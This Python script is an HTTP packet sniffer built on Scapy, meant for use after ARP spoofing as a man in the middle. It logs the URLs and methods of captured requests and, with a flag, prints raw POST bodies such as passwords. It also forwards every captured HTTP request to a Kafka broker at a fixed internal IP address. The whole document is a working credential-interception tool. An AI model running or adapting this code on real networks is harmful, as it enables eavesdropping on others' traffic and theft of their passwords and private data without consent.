
from colorama import Fore, init
from kafka import KafkaProducer
from scapy.all import *
from scapy.layers.http import HTTPRequest  # import HTTP packet

# initialize colorama
init()
# define colors
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
kfk_producer = KafkaProducer(bootstrap_servers="10.64.131.60:9092")


def sniff_packets(iface=None):
    """
    Sniff 80 port packets with `iface`, if None (default), then the
    Scapy's default interface is used
    """
    if iface:
        # port 80 for http (generally)
        # `process_packet` is the callback
        sniff(filter="tcp and portrange 80-443",
              prn=process_packet, iface=iface, store=False)
    else:
        # sniff with default interface
        sniff(filter="tcp and portrange 80-443",
              prn=process_packet, store=False)


def process_packet(packet):
    """
    This function is executed whenever a packet is sniffed
    """
    if packet.haslayer(HTTPRequest):
        future = kfk_producer.send(
            "http_packet", raw(packet)
        )
        result = future.get(timeout=0.1)
        print(f"Sent Http Packet 2 Kfk-http_packet: {result}")
        # if this packet is an HTTP Request
        # get the requested URL
        url = packet[HTTPRequest].Host.decode(
        ) + packet[HTTPRequest].Path.decode()
        # get the requester's IP Address
        ip = packet[IP].src
        # get the request method
        method = packet[HTTPRequest].Method.decode()
        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
        if show_raw and packet.haslayer(Raw) and method == "POST":
            # if show_raw flag is enabled, has raw data, and the requested method is "POST"
            # then show raw
            print(
                f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}"
            )
    else:
        print(
            f"TCP {GREEN}[+] {packet[IP].src}:{packet[TCP].sport} --> {packet[IP].dst}:{packet[TCP].dport}{RESET}"
        )


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle."
                                                 + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
    parser.add_argument(
        "-i", "--iface", help="Interface to use, default is scapy's default interface")
    parser.add_argument("--show-raw", dest="show_raw", action="store_true",
                        help="Whether to print POST raw data, such as passwords, search queries, etc.")
    # parse arguments
    args = parser.parse_args()
    iface = args.iface
    show_raw = args.show_raw
    sniff_packets(iface)
